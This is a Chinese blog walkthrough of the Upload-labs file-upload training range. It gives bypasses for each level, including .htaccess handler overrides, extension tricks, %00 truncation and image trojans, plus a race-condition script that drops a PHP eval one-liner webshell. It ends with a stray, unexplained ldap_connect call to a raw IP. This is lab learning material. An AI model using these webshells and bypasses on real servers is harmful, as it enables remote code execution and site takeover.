---
title: Upload-labs
date: 2021-11-2 22:19
tags: 文件上传
categories: 文件上传
top_img: https://wallroom.io/img/2560x1440/bg-217fe9c.jpg
cover: https://images3.alphacoders.com/681/thumbbig-681016.webp
---

## Pass 1

利用burp抓包，点击send to repeaer  

![https://editor.csdn.net/md/?not_checkout=1&articleId=120932072](https://img-blog.csdnimg.cn/7375c2d9bf0c44f1a85493acdf31537d.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

将1.png换成gg.php后发现成功绕过，上传

![在这里插入图片描述](https://img-blog.csdnimg.cn/8caf0d9454304cdd945d0ff35c5c6794.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

## Pass 2（Content-type）

查看源码，发现只检查Content-type的类型

![在这里插入图片描述](https://img-blog.csdnimg.cn/44dc76a140074471a318867dc9e723d2.png)

所以更改Content-type的类型为image/jpeg、image/png、image/gif即可绕过

![在这里插入图片描述](https://img-blog.csdnimg.cn/28aa8440734042499c2f459f443d9e25.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

发现gg.php上传成功

## Pass 3（后缀名绕过）

查看源码发现，常规的格式都被过滤了

![在这里插入图片描述](https://img-blog.csdnimg.cn/f463f2298c724fadb9ac2550fffce9a6.png)

所以可以使用phtml，php3，php4, php5, pht后缀名都可以绕过

![在这里插入图片描述](https://img-blog.csdnimg.cn/6cc5ae60dfdc4e20bbaba525b14b3132.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

成功上传gg.php

## Pass 4（.htaccess文件）

查看源码，发现基本所有格式都被过滤了

![在这里插入图片描述](https://img-blog.csdnimg.cn/f612cb61b3104d149a03bc97732b9aeb.png)

但是.htaccess还是没有过滤，可以重写文件解析规则绕过，上传一个.htaccess文件
关于.htaccess的资料可以参考https://www.cnblogs.com/engeng/articles/5948089.html
.htaccess的内容如下

```
<FilesMatch "ceshi">
SetHandler application/x-httpd-php
</FilesMatch>   
```

这时先上传一个.htaccess文件

![在这里插入图片描述](https://img-blog.csdnimg.cn/43e981fb297248a7a89a12dade4326f7.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

然后再上传ceshi.txt，内容为

```
<?php
phpinfo();
?>
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/b6473d4ea7b147c0afa0871f4a730ef7.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

得到一个地址，访问它

![在这里插入图片描述](https://img-blog.csdnimg.cn/27d738ab0e01487bb905b657cdf9e2d7.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

回显了phpinfo，说明上传成功

## Pass 5（后缀大小写）

查看源码，发现.htaccess也被过滤了，但是少了这句话，所以我们可以将后缀大小写混合绕过

```
 $file_ext = strtolower($file_ext); //转后缀换为小写
```

成功上传

![在这里插入图片描述](https://img-blog.csdnimg.cn/f79c636930354edfa7ab1ff5555f8b01.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

## Pass 6（空格绕过）

比第五关少了这句话，所以可以将后缀名后面加上个空格绕过

```
 $file_ext = trim($file_ext); //将首尾去除空格
```

成功上传

![在这里插入图片描述](https://img-blog.csdnimg.cn/8c449d4e7dd04263b5bc794e7a02d46a.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

当然，前面加个空格也是可以的

![在这里插入图片描述](https://img-blog.csdnimg.cn/ffc6296e9cd4435f94cc71de23741c30.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

## Pass 7（后缀加点绕过）

对比源码，比第六关少了一句话

```
$file_name = dedot($file_name);//删除文件名末尾的点
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/9b1d09cf46c34afb9a1c11e9859dae7f.png)

所以，在后缀后面加个点即可

![在这里插入图片描述](https://img-blog.csdnimg.cn/6c177f7dd2214bb1813b9da5ce2a73d1.png)

成功上传

## Pass 8（::$DATA绕过）

少了这句话

```
 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
```

所以可以在后缀后面加一个::$DATA即可

![在这里插入图片描述](https://img-blog.csdnimg.cn/95d61bd21c2b4d8997744434ccc3c27d.png)

成功上传

## Pass 9

查看源码，发现全部都过滤了

![在这里插入图片描述](https://img-blog.csdnimg.cn/9f2d84e9d56c42d08de8c3bb1f40a9f9.png)

但是都只过滤了一次，所以我们可以在后缀后面加上点空格点. .

![在这里插入图片描述](https://img-blog.csdnimg.cn/2e033dee2b834c7f91ca5a86dfc9d14f.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

## Pass 10（乱序双写）

查看源码，这两句是关键，他会过滤连在一起的php，其他该过滤的都过滤了

![在这里插入图片描述](https://img-blog.csdnimg.cn/b4e5b707ec644f36936f0d34e019e4d9.png)

所以使用乱序双写后缀，中间夹一个php即可

![在这里插入图片描述](https://img-blog.csdnimg.cn/5774405573f94f8ba41751a933c4fcdd.png)

## Pass 11*

查看源码，发现关键在这里，save_path后面跟上了一个后缀，需要绕过，原理我也不懂，反正说要使用%00截断，但是需要两个条件1.php版本小于5.3.4    2.php的magic_quotes_gpc为OFF状态


```
$img_path = $_GET['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext;
```

所以如果要绕过，令save_path等于../upload/gg.php%00

![在这里插入图片描述](https://img-blog.csdnimg.cn/754152c229994b9a861beac3161315e5.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_17,color_FFFFFF,t_70,g_se,x_16)

这样应该就可以了

## Pass 12*

这里和11只有一个变化，就是get变成了post

```
$img_path = $_POST['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext;
```

绕过的方式一样，只不过这里需要在二进制里面修改%00，因为post不会像get对%00进行自动解码。

找到对应的地方改为00即可

![在这里插入图片描述](https://img-blog.csdnimg.cn/7efbbf6ce54b4f5da8aba9863f99d2a8.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/06827f2713f0416080beb9f57b24b2b4.png)

成功上传

## Pass 13（图片马）

利用图片马上传，就是将木马包含在一张图片里绕过上传

最简单制作图片马的方法就是在cmd中运行，shell.png即是图片马

```
copy 1.png/b+ 2.php/a shell.png
```

我在php中写的便是echo‘hello world’可以看到成功上传，这里我们得到了上传图片的位置

![在这里插入图片描述](https://img-blog.csdnimg.cn/ecd9b4dae9444070a238d6db194418ce.png)

之后根据提示，利用文件包含漏洞

![在这里插入图片描述](https://img-blog.csdnimg.cn/63721bb32cbd491ba3e82e94d21f301a.png)

```php
<?php
/*
本页面存在文件包含漏洞，用于测试图片马是否能正常运行！
*/
header("Content-Type:text/html;charset=utf-8");
$file = $_GET['file'];
if(isset($file)){
    include $file;
}else{
    show_source(__file__);
}
?>
```

访问图片

```
http://39f12657-51c0-486d-893a-7f82c1c9f47e.node4.buuoj.cn:81/include.php?file=upload/5520211116122413.jpg
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/b0b068d339f24d37a9f9d0404b4bce08.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

可以看到最后出现了hello world，说明上传成功了

## Pass 14（图片马）

同13一样，还是可以图片马上传绕过，只是这里用了getimagesize函数来对文件类型做判断

![在这里插入图片描述](https://img-blog.csdnimg.cn/bf5a63e521084bfeabfce30df09b9dc6.png)

## Pass 15（图片马）

用了exif_imagetype函数用于确定图像的类型，还是可以用图片马绕过，方法同13，14

## Pass 16（二次渲染）

二次渲染，会将上传的图片进行更改，然后原来写入图片的木马就会消失，所以我们先上传一个png的图片

用HxD打开上传前

![在这里插入图片描述](https://img-blog.csdnimg.cn/b72aefe82e0b40e48133b137ea4e9c96.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

上传之后系统会返回给我们一个二次渲染后的文件，打开，

发现我们的木马消失了

![在这里插入图片描述](https://img-blog.csdnimg.cn/fd0265fe51744589b9c2c404805426e3.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

所以我们对比两张图片相同的地方，在里面插入shell就可以绕过了。

## Pass 17,18（条件竞争上传）

使用burpsuite抓包上传1.php，一直重放上传文件
1.php内容：

```
<?php fputs(fopen('2.php','w'),<?php @eval($_POST["x"])?>‘);?>
```

访问了1.php文件，php文件就会成功执行，自动创建一个2.php，写入一句话木马：

```
<?php @eval($_POST["x"]);?>
```

用Burp不断上传，再用burp不断访问即可

## Pass 20（递归/.）

观察源码，发现move_uploaded_file.

![在这里插入图片描述](https://img-blog.csdnimg.cn/094fb61322774c5b976b3361ff5ebf7b.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

该函数会递归删除文件名最后的/.
所以上传文件名为1.php/.即可绕过

![在这里插入图片描述](https://img-blog.csdnimg.cn/fdc1caa62d3b46c8a66f54bb4a99721c.png?x-ss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_14,color_FFFFFF,t_70,g_se,x_16)













```
ldap_connect(“47.106.172.144:2333”)
```

